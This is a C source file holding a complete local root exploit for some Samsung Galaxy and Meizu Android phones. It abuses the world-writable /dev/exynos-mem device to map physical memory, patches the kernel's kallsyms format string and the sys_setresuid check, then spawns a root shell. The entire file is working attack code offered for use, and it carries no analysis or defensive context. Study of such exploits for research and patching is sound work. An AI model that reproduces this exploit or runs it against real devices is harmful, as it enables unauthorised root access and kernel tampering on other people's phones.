/*
 * exynos-mem device abuse by alephzain
 *
 * /dev/exynos-mem is present on GS3/GS2/GN2/MEIZU MX
 *
 * the device is R/W by all users :
 * crw-rw-rw-  1 system graphics  1, 14 Dec 13 20:24 /dev/exynos-mem
 *
 */

/*
 * Abuse it for root shell
 */
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>

#define PAGE_OFFSET 0xC0000000
#define PHYS_OFFSET 0x40000000

int main(int argc, char **argv, char **env) {
	int fd, i, m, index, result;

	unsigned long *paddr = NULL;
    unsigned long *tmp = NULL;
    unsigned long *restore_ptr_fmt = NULL;
    unsigned long *restore_ptr_setresuid = NULL;
    unsigned long addr_sym;

	int page_size = sysconf(_SC_PAGE_SIZE);
    int length = page_size * page_size;

    /* for root shell */
    char *cmd[2];
    cmd[0] = "/system/bin/sh";
    cmd[1] = NULL;

    /* /proc/kallsyms parsing */
    FILE *kallsyms = NULL;
    char line [512];
    char *ptr;
    char *str;

    bool found = false;

    /* open the door */
	fd = open("/dev/exynos-mem", O_RDWR);
	if (fd == -1) {
		printf("[!] Error opening /dev/exynos-mem\n");
		exit(1);
	}

    /* kernel reside at the start of physical memory, so take some Mb */
    paddr = (unsigned long *)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);
    tmp = paddr;
    if (paddr == MAP_FAILED) {
        printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
        exit(1);
    }

    /*
     * search the format string "%pK %c %s\n" in memory
     * and replace "%pK" by "%p" to force display kernel
     * symbols pointer
     */
    for(m = 0; m < length; m += 4) {
        if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
            printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
            restore_ptr_fmt = tmp;
            *(unsigned long*)tmp = 0x20207025;
            found = true;
            break;
        }
        tmp++;
    }

    if (found == false) {
        printf("[!] s_show->seq_printf format string not found\n");
        exit(1);
    }

    found = false;

    /* kallsyms now display symbols address */       
    kallsyms = fopen("/proc/kallsyms", "r");
    if (kallsyms == NULL) {
        printf("[!] kallsysms error: %s\n", strerror(errno));
        exit(1);
    }

    /* parse /proc/kallsyms to find sys_setresuid address */
    while((ptr = fgets(line, 512, kallsyms))) {
        str = strtok(ptr, " ");
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, " ");
            index++;
            if (index == 3) {
                if (strncmp("sys_setresuid\n", str, 14) == 0) {
                    printf("[*] sys_setresuid found at 0x%08X\n",addr_sym);
                    found = true;
                }
                break;
            }
        }
        if (found) {
            tmp = paddr;
            tmp += (addr_sym - PAGE_OFFSET) >> 2;
            for(m = 0; m < 128; m += 4) {
                if (*(unsigned long *)tmp == 0xe3500000) {
                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
                    restore_ptr_setresuid = tmp;
                    *(unsigned long *)tmp = 0xe3500001;
                    break;
                }
                tmp++;
            }
            break;
        }
    }

    fclose(kallsyms);

    /* to be sure memory is updated */
    usleep(100000);

    /* ask for root */
    result = setresuid(0, 0, 0);

    /* restore memory */
    *(unsigned long *)restore_ptr_fmt = 0x204b7025;
    *(unsigned long *)restore_ptr_setresuid = 0xe3500000;
    munmap(paddr, length);
    close(fd);

    if (result) {
        printf("[!] set user root failed: %s\n", strerror(errno));
        exit(1);
    }

    /* execute a root shell */
    execve (cmd[0], cmd, env);

	return 0;
}
